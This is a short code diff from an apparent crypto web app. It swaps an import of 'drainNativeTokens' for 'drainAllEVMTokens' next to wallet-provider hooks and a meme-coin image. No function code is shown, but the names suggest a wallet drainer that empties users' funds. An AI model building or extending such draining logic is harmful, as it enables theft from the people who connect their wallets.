@@ -17,7 +17,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { Link } from 'react-router-dom';
 import apepeImage from '@/assets/apepe.jpg';
 
